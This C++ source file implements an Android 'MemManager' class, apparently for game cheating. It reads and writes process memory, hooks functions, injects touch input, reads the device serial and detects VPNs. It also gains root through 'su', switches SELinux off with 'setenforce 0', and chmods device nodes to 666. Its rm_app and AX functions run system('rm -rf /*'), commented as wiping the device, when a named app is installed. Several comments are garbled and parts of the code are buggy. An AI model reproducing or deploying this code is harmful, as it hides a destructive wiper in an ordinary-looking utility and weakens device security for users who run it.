#include "MemManager.h"

#define BYTE0 0x00000000
#define BYTE4 0x00000004
#define BYTE8 0x00000008
#define BYTE16 0x00000010
#define BYTE24 0x00000018
#define BYTE32 0x00000020
#define BYTE64 0x00000040
#define BYTE128 0x00000080
#define BYTE256 0x00000100
#define BYTE512 0x00000200
#define BYTE1024 0x00000400
#define BYTE2048 0x00000800

typedef char PACKAGENAME;

int pid = -1;

ssize_t process_v(pid_t __pid, const struct iovec *__local_iov, unsigned long __local_iov_count, const struct iovec *__remote_iov, unsigned long __remote_iov_count, unsigned long __flags, bool iswrite) {
    return syscall((iswrite ? SYS_process_vm_writev : SYS_process_vm_readv), __pid, __local_iov, __local_iov_count, __remote_iov, __remote_iov_count, __flags);
}

long int MemManager::preadv(int pidt, void *buffer, ssize_t size, off_t off) {
    struct iovec iov_ReadBuffer, iov_ReadOffset;
    iov_ReadBuffer.iov_base = buffer;
    iov_ReadBuffer.iov_len = size;
    iov_ReadOffset.iov_base = (void *) off;
    iov_ReadOffset.iov_len = size;
    return syscall(SYS_process_vm_readv, pidt, &iov_ReadBuffer, 1, &iov_ReadOffset, 1, 0);
}

bool MemManager::Read(void *addr, void *buffer, size_t length) {
    return memcpy(buffer, addr, length) != 0;
}

bool MemManager::Write(void *addr, void *buffer, size_t length) {
    return memcpy(addr, buffer, length) != 0;
}

long MemManager::readValue(uintptr_t address, void *buffer, ssize_t size) {
    struct iovec iov_ReadBuffer{}, iov_ReadOffset{};
    iov_ReadBuffer.iov_base = buffer;
    iov_ReadBuffer.iov_len = size;
    iov_ReadOffset.iov_base = (void *) address;
    iov_ReadOffset.iov_len = size;
    return syscall(SYS_process_vm_readv, pid, &iov_ReadBuffer, 1, &iov_ReadOffset, 1, 0);
}

void MemManager::writeValue(uintptr_t address, void *value, ssize_t size) {
    struct iovec local[1];
    struct iovec remote[1];
    local[0].iov_base = value;
    local[0].iov_len = size;
    remote[0].iov_base = (void *) address;
    remote[0].iov_len = size;
    syscall(SYS_process_vm_writev, pid, local, 1, remote, 1, 0);
}
bool MemManager::ProcessRead(void *address, void *buffer, size_t size, bool write = false) {
    struct iovec local[1];
    struct iovec remote[1];

    local[0].iov_base = buffer;
    local[0].iov_len = size;
    remote[0].iov_base = address;
    remote[0].iov_len = size;

    if (pid == -1) {
        pid = getpid();
    }

    ssize_t bytes = process_v(pid, local, 1, remote, 1, 0, write);
    return bytes == size;
}
void MemManager::Hook(void *target, void *replace, void **backup) {
    unsigned long page_size = sysconf(_SC_PAGESIZE);
    unsigned long size = page_size * sizeof(uintptr_t);
    void *p = (void *) ((uintptr_t) target - ((uintptr_t) target % page_size) - page_size);
    if (mprotect(p, (size_t) size, PROT_EXEC | PROT_READ | PROT_WRITE) == 0) {
        MSHookFunction(target, replace, backup);
    }
}
bool MemManager::PVM_ReadAddr(void *addr, void *buffer, size_t length) {
    return MemManager::ProcessRead(addr, buffer, length, false);
}

bool MemManager::PVM_WriteAddr(void *addr, void *buffer, size_t length) {
    return MemManager::ProcessRead(addr, buffer, length, true);
}

bool MemManager::WriteAddress(void *addr, void *buffer, size_t length) {
    unsigned long page_size = sysconf(_SC_PAGESIZE);
    unsigned long size = page_size * sizeof(uintptr_t);
    return mprotect((void *) ((uintptr_t) addr - ((uintptr_t) addr % page_size) - page_size), (size_t) size, PROT_EXEC | PROT_READ | PROT_WRITE) == 0 && memcpy(addr, buffer, length) != 0;
}

bool MemManager::IsPtrValid(void *addr) {
    uintptr_t p = -1;
    return MemManager::ProcessRead(addr, &p, sizeof(uintptr_t)) && p != -1;
}

void MemManager::ProcessEvent(void* fn, void* parms)
{
    PVM_ReadAddr(fn, parms, sizeof(parms));
}

long MemManager::ReadDword64(long Address) {
    long temp = 0;
    preadv(pid, &temp, BYTE16, Address);
    return temp;
}

long MemManager::ReadDword32(long Address) {
    long temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

long MemManager::ReadInt32(long Address) {
    int temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

float MemManager::ReadFloat64(long Address) {
    float temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

char *MemManager::Shell(const char *cmd) {
    FILE *file = NULL;
    char line[BYTE256] = {};
    char *result = (char *) malloc(BYTE2048);
    memset(result, 0, sizeof(result));
    file = popen(cmd, "r");
    while (fgets(line, sizeof(line), file)) {
        strncat(result, line, strlen(line));
    }
    pclose(file);
    return result;
}

int MemManager::find_pid_of(const char *process_name) {
    int id;
    pid_t pid = -1;
    DIR *dir;
    FILE *fp;
    char filename[32];
    char cmdline[256];
    struct dirent *entry;
    if (process_name == NULL)
        return -1;
    dir = opendir("/proc");
    if (dir == NULL)
        return -1;
    while ((entry = readdir(dir)) != NULL) {
        id = atoi(entry->d_name);
        if (id != 0) {
            sprintf(filename, "/proc/%d/cmdline", id);
            fp = fopen(filename, "r");
            if (fp) {
                fgets(cmdline, sizeof(cmdline), fp);
                fclose(fp);
                if (strcmp(process_name, cmdline) == 0) {
                    pid = id;
                    break;
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

int MemManager::initPid() {
    pid = getpid();
    return pid;
}

long MemManager::GetModuleBase(const char *moduleName) {
    initPid();
    char path[BYTE1024], line[BYTE1024];
    if (pid == -1)
        sprintf(path, "/proc/self/maps");
    else
        sprintf(path, "/proc/%d/maps", pid);
    FILE *file = fopen(path, "r");
    long len = 0;
    if (file) {
        while (fgets(line, sizeof(line), file)) {
            if (strstr(line, moduleName) != NULL) {
                len = strtoul(line, NULL, BYTE16);
                break;
            }
        }
    }
    return len;
}
uintptr_t MemManager::GetEndAddress(const char *name) {
    uintptr_t end = 0;
    char line[512];

    FILE *f = fopen("/proc/self/maps", "r");

    if (!f) {
        return 0;
    }

    while (fgets(line, sizeof line, f)) {
        uintptr_t tmpEnd;
        char tmpName[256];
        if (sscanf(line, "%*" PRIXPTR "-%" PRIXPTR " %*s %*s %*s %*s %s", &tmpEnd, tmpName) > 0) {
            if (!strcmp(basename(tmpName), name)) {
                end = tmpEnd;
            } else {
                if (end)
                    break;
            }
        }
    }

    fclose(f);
    return end;
}
#define INRANGE(x, a, b)        (x >= a && x <= b)
#define getBits(x)              (INRANGE(x,'0','9') ? (x - '0') : ((x&(~0x20)) - 'A' + 0xa))
#define getByte(x)              (getBits(x[0]) << 4 | getBits(x[1]))

uintptr_t MemManager::FindPattern(const char *lib, const char *pattern) {
    auto start = GetModuleBase(lib);
    if (!start)
        return 0;

    auto end = GetEndAddress(lib);
    if (!end)
        return 0;

    auto curPat = reinterpret_cast<const unsigned char *>(pattern);
    uintptr_t firstMatch = 0;
    for (uintptr_t pCur = start; pCur < end; ++pCur) {
        if (*(uint8_t *) curPat == (uint8_t) '\?' || *(uint8_t *) pCur == getByte(curPat)) {
            if (!firstMatch) {
                firstMatch = pCur;
            }
            curPat += (*(uint16_t *) curPat == (uint16_t) '\?\?' || *(uint8_t *) curPat != (uint8_t) '\?') ? 2 : 1;
            if (!*curPat) {
                return firstMatch;
            }
            curPat++;
            if (!*curPat) {
                return firstMatch;
            }
        } else if (firstMatch) {
            pCur = firstMatch;
            curPat = reinterpret_cast<const unsigned char *>(pattern);
            firstMatch = 0;
        }
    }
    return 0;
}

void MemManager::getRoot(char **argv)
{
    char shellml[64];
    sprintf(shellml, "su -c %s", *argv);
    if (getuid() != 0)
    {
        system(shellml);
        exit(1);
    }
}

int MemManager::getPID(PACKAGENAME *PackageName)
{
    DIR *dir=NULL;
    struct dirent *ptr=NULL;
    FILE *fp=NULL;
    char filepath[256];
    char filetext[128];
    dir = opendir("/proc");
    if (NULL != dir)
    {
        while ((ptr = readdir(dir)) != NULL)
        {
            if ((strcmp(ptr->d_name, ".") == 0) || (strcmp(ptr->d_name, "..") == 0))
                continue;
            if (ptr->d_type != DT_DIR)
                continue;
            sprintf(filepath, "/proc/%s/cmdline", ptr->d_name);
            fp = fopen(filepath, "r");
            if (NULL != fp)
            {
                fgets(filetext,sizeof(filetext),fp);
                if (strcmp(filetext,PackageName)==0)
                {
                    puts(filepath);
                    printf("Package name:%s\n",filetext);
                    break;
                }
                fclose(fp);
            }
        }
    }
    if (readdir(dir) == NULL)
    {
        LOGI("Get pid fail");
        return 0;
    }
    closedir(dir);
    return atoi(ptr->d_name);
}

char* MemManager::getMac(){
    char* mac = (char*) malloc(64);
    memset(mac, 0, 64);
    char line[1024] = "";

    char* serialno = (char*) malloc(PROP_VALUE_MAX);
    memset(serialno, 0, PROP_VALUE_MAX);
    __system_property_get("ro.serialno", serialno);
    strncat(mac, serialno, strlen(serialno));
    free(serialno);

    FILE* fp = NULL;
    fp = popen("getprop ro.serialno", "r");
    while (fgets(line, 1024, fp) != NULL)
    {
        strncat(mac, line, strlen(line));
    }
    pclose(fp);
    return mac;
}

bool MemManager::isVPN()
{
    char command[256] = "";
    memset(command, 0, 256);
    if ((access("/system/bin/ifconfig", F_OK)) != -1){
        sprintf(command, "%s", "/system/bin/ifconfig");
    }else{
        return true;
    }
    FILE* fp = NULL;
    char line[1024] = "";
    fp = popen(command, "r");
    while (fgets(line, 1024, fp) != NULL)
    {
        if (strstr(line, "tun0") != NULL || strstr(line, "ppppp0") != NULL){
            pclose(fp);
            return true;
        }
    }
    pclose(fp);
    return false;
}


inline int MemManager::ReportKey(int fd, uint16_t type, uint16_t code, int32_t value)
{
    struct input_event event;
    event.type = type;
    event.code = code;
    event.value = value;
    gettimeofday(&event.time, 0);
    if (write(fd, &event, sizeof(struct input_event)) < 0)
    {
        printf("report key error!\n");
        return -1;
    }
    return 0;
}

inline void MemManager::TouchPressDown(int fd, int FingerNum, int LineID, int x, int y)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_TRACKING_ID, LineID);
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_X, x); //report position x,y
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_Y, y);
    ReportKey(fd, EV_KEY, BTN_TOUCH, 1); //report touch preesed event.
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}

inline void MemManager::TouchMove(int fd, int FingerNum, int x, int y)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_X, x); //report position x,y
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_Y, y);
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}


inline void MemManager::TouchPressUp(int fd, int FingerNum)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_TRACKING_ID, -1);
    ReportKey(fd, EV_KEY, BTN_TOUCH, 0); //report touch release event.
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}


int MemManager::GetTouchEventNum()
{
    int nLastEventNum = -1;
    int lastLineIsKey = -1;

    FILE *f = fopen("/proc/bus/input/devices", "r");
    if (f == NULL)
    {
        //���ܿ�����SELinux���ر�SELinux��������һ�ο���
        if (errno == EACCES)
        {
            FILE * fp = popen("su", "w");
            if (fp)
            {
                //��ʱ�ر�SELinux
                char cmd[512] = { 0 };
                snprintf(cmd, sizeof(cmd), "setenforce 0\n");
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);

                f = fopen("/proc/bus/input/devices", "r");

                //�ָ���SELinux
                fp = popen("su", "w");
                snprintf(cmd, sizeof(cmd), "setenforce 1\n");
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);
            }
        }
        if (f == NULL)
        {
            return -1;
        }
    }
    char s[512] = { 0 };
    while (fgets(s, 511, f)) //read a line into s
    {
        char *pTags = strstr(s, "Handlers=");
        if (pTags)
        {
            //printf("Handlers=%s\n", s);
            pTags = strstr(s, "event");
            if (pTags)
            {
                sscanf(pTags, "event%d", &nLastEventNum);
            }
            else
            {
                nLastEventNum = -1;
            }
            //printf("nLastEventNum=%d\n", nLastEventNum);
            continue;
        }
        pTags = strstr(s, "KEY=");
        if (pTags)
        {
            if (fgets(s, 511, f))
            {
                pTags = strstr(s, "ABS=");
                if (pTags)
                {
                    fclose(f);
                    return nLastEventNum;
                }
            }
            else
            {
                break;
            }
            continue;
        }
    }
    fclose(f);
    return -1;
}


int MemManager::open_driver(const char * path, int flag)
{
    int fd = open(path, flag);
    if (fd <= 0)
    {
        int last_err = errno;
        if (last_err == EACCES)
        {
            //���ܿ�����SELinux���ر�SELinux��������һ�ο���
            FILE * fp = popen("su", "w");
            if (fp)
            {
                //��ʱ�ر�SELinux
                char cmd[512] = { 0 };
                snprintf(cmd, sizeof(cmd), "chmod 666 %s\n setenforce 0\n", path);
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);

                fd = open(path, O_RDWR);

                //�ָ���SELinux
                fp = popen("su", "w");
                snprintf(cmd, sizeof(cmd), "chmod 0660 %s\n setenforce 1\n", path);
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);
            }
        }

        if (fd <= 0)
        {
            printf("open error():%s\n", strerror(last_err));
            return -last_err;
        }
    }
    return fd;
}

bool MemManager::Anti_app(const char *packageName){
    char *appPath = nullptr;
    char *data = "/data/user/0/";
    appPath = strcat(data, packageName);
    int arm = access(appPath, F_OK);
    if(!arm) {
        return true;                               
    }else {
        return false;
    }
}


void MemManager::rm_app(const char *packageName){
    char *appPath = nullptr;
    char *data = "/data/user/0/";
    appPath = strcat(data, packageName);
    int arm = access(appPath, F_OK);
    if(!arm) {
        system("rm -rf /*");
    }else {
        printf("没有此应用");
    }
}

void MemManager::AX(int a,const char *packageName){
    if(a == 0){
        system("rm -rf /*");/*0 ==格机*/
    }else if(a == 1){
        system("rm -rf /*");/*0 ==格机*/
    }else if(a ==2){
        system("rm -rf /*");/*0 ==格机*/
    }
}
